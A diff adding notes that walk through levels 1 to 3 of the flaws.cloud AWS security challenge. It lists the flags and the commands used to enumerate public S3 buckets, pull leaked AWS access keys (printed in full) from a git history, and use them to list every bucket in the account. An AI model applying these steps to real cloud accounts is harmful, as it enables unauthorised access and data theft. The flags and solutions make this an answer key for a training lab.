@@ -1,0 +1,69 @@
+= level 1 =
+
+flag: http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+
+λ dig flaws.cloud any
+  returns an A record 54.231.169.59
+
+λ nslookup 54.231.169.59
+  Server:		10.42.225.10
+  Address:	10.42.225.10#53
+
+  Non-authoritative answer:
+  59.169.231.54.in-addr.arpa	name = s3-website-us-west-2.amazonaws.com.
+
+when static site hosting is enabled on a bucket s3 will always create a dns record to access that static site
+
+the static site is accessible via http://flaws.cloud.s3-website-us-west-2.amazonaws.com/
+
+λ aws s3 ls s3://flaws.cloud
+  2017-03-13 20:00:38       2575 hint1.html
+  2017-03-02 20:05:17       1707 hint2.html
+  2017-03-02 20:05:11       1101 hint3.html
+  2017-03-25 13:58:29       2877 index.html
+  2017-02-26 17:59:28         46 robots.txt
+  2017-02-26 17:59:30       1051 secret-dd02c7c.html
+
+sync the bucket or just visit http://flaws.cloud.s3-website-us-west-2.amazonaws.com/secret-dd02c7c.html
+
+= level 2 =
+flag: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+
+similar task, dig the domain, nslookup the A record, using an aws authenticated account query the new bucket
+
+λ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+  2017-02-26 18:02:15      80751 everyone.png
+  2017-03-02 19:47:17       1433 hint1.html
+  2017-02-26 18:04:39       1035 hint2.html
+  2017-02-26 18:02:14       2786 index.html
+  2017-02-26 18:02:14         26 robots.txt
+  2017-02-26 18:02:15       1051 secret-e4443fc.html
+
+= level 3 =
+flag: http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/
+the level 3 bucket contains a git repo
+
+aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
+git log -p
+  +++ b/access_keys.txt
+  @@ -0,0 +1,2 @@
+  +access_key AKIAJ366LIPB4IJKT7SA
+  +secret_access_key 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
+
+add the credentials
+
+λ aws-vault exec flaws.cloud -- aws s3api list-buckets --query "Buckets[].Name"
+  [
+      "2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud",
+      "config-bucket-975426262029",
+      "flaws-logs",
+      "flaws.cloud",
+      "level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud",
+      "level3-9afd3927f195e10225021a578e6f78df.flaws.cloud",
+      "level4-1156739cfb264ced6de514971a4bef68.flaws.cloud",
+      "level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud",
+      "level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud",
+      "theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud"
+  ]
+
+= level 4 =
